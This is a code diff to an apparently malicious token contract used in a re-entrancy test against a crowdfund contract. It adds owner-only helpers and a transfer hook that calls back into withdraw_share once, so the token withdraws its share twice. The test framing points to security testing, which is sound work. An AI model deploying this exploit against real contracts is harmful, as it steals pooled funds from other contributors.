@@ -4,6 +4,10 @@ I = importlib # Make sure importlib is available if used via I
 balances = Hash(default_value=decimal('0.0'))
 metadata = Hash()
 
+re_entry_target_contract_for_withdraw = Variable()
+re_entry_target_pool_id_for_withdraw = Variable()
+re_entry_owner = Variable() # To control sensitive operations
+
 # Re-entrancy specific state
 re_entry_target_crowdfund_name = Variable()
 re_entry_pool_id_for_crowdfund = Variable()
@@ -15,6 +19,43 @@ re_entry_max_attempts = Variable() # To prevent infinite loops in complex scenar
 def seed():
     re_entry_attempt_count.set(0)
     re_entry_max_attempts.set(1) # Only re-enter once for this test
+    re_entry_owner.set(ctx.caller) # Set owner
+
+@export
+def change_owner(new_owner: str):
+    assert ctx.caller == re_entry_owner.get(), "Only owner can change owner."
+    re_entry_owner.set(new_owner)
+
+@export
+def configure_re_entrancy_for_withdraw(crowdfund_name: str, pool_id: str):
+    assert ctx.caller == re_entry_owner.get(), "Only owner can configure re-entrancy for withdraw."
+    re_entry_target_contract_for_withdraw.set(crowdfund_name)
+    re_entry_target_pool_id_for_withdraw.set(pool_id)
+    re_entry_attempt_count.set(0) # Reset attempt count for this specific re-entrancy path
+
+# This method allows the contract to approve a spender for tokens it owns (e.g., pool_tokens)
+@export
+def execute_token_approve(token_contract_name: str, spender: str, amount: float):
+    assert ctx.caller == re_entry_owner.get(), "Only owner can execute approve."
+    token_contract = I.import_module(token_contract_name)
+    # The malicious token contract (ctx.this) is the one calling approve on the target token contract
+    token_contract.approve(to=spender, amount=amount)
+
+# This method allows the contract to call contribute on a crowdfund contract
+@export
+def execute_contribute(crowdfund_contract_name: str, pool_id: str, amount: float):
+    assert ctx.caller == re_entry_owner.get(), "Only owner can execute contribute."
+    crowdfund_contract = I.import_module(crowdfund_contract_name)
+    # The malicious token contract (ctx.this) is the one calling contribute
+    crowdfund_contract.contribute(pool_id=pool_id, amount=amount)
+
+# This method allows the contract to call withdraw_share on a crowdfund contract
+@export
+def execute_withdraw_share(crowdfund_contract_name: str, pool_id: str):
+    assert ctx.caller == re_entry_owner.get(), "Only owner can execute withdraw_share."
+    crowdfund_contract = I.import_module(crowdfund_contract_name)
+    # The malicious token contract (ctx.this) is the one calling withdraw_share
+    crowdfund_contract.withdraw_share(pool_id=pool_id)
 
 def internal_approve(spender: str, amount_to_approve: float):
     # print(f"MALICIOUS TOKEN (internal_approve): Owner '{ctx.this}' (this contract) is approving spender '{spender}' for {amount_to_approve}")
@@ -53,14 +94,40 @@ def mint(amount: float, to: str):
 @export
 def transfer(amount: float, to: str):
     assert amount > 0, "Transfer amount must be positive"
-    sender = ctx.caller
+    # sender is ctx.caller when an EOA calls transfer.
+    # sender is the calling contract (con_crowdfund_otc) when con_crowdfund_otc calls this transfer.
+    sender = ctx.caller 
+    
     sender_bal = balances[sender] if balances[sender] is not None else decimal('0')
-    assert sender_bal >= amount, f"Insufficient balance for {sender}"
+    # If con_crowdfund_otc is transferring, its balance of these malicious tokens is checked.
+    assert sender_bal >= amount, f"Insufficient balance for sender {sender}"
 
     balances[sender] = sender_bal - amount
     
     receiver_bal = balances[to] if balances[to] is not None else decimal('0')
     balances[to] = receiver_bal + amount
+
+    # --- RE-ENTRANCY LOGIC FOR WITHDRAW_SHARE ---
+    # This re-entrancy happens when this `transfer` is called by `con_crowdfund_otc.withdraw_share`
+    current_attempts = re_entry_attempt_count.get()
+    max_attempts = re_entry_max_attempts.get() # Should be 1 for this exploit
+
+    target_crowdfund_withdraw = re_entry_target_contract_for_withdraw.get()
+    target_pool_withdraw = re_entry_target_pool_id_for_withdraw.get()
+
+    if target_crowdfund_withdraw and target_pool_withdraw and current_attempts < max_attempts:
+        # Check if the caller of this transfer is the crowdfund contract we are targeting for re-entrancy
+        # (i.e., this transfer is part of a withdraw_share operation from that crowdfund contract)
+        # And the recipient `to` is this malicious contract itself (MT_address)
+        # This means MT_address is withdrawing its share from the crowdfund contract.
+        if sender == target_crowdfund_withdraw and to == ctx.this:
+            re_entry_attempt_count.set(current_attempts + 1)
+            
+            crowdfund_contract_to_reenter = I.import_module(target_crowdfund_withdraw)
+            # The malicious contract (ctx.this) re-enters withdraw_share for itself.
+            crowdfund_contract_to_reenter.withdraw_share(pool_id=target_pool_withdraw) 
+            # Note: ctx.caller for the re-entrant withdraw_share will be this malicious token contract.
+    
     return True
 
 @export
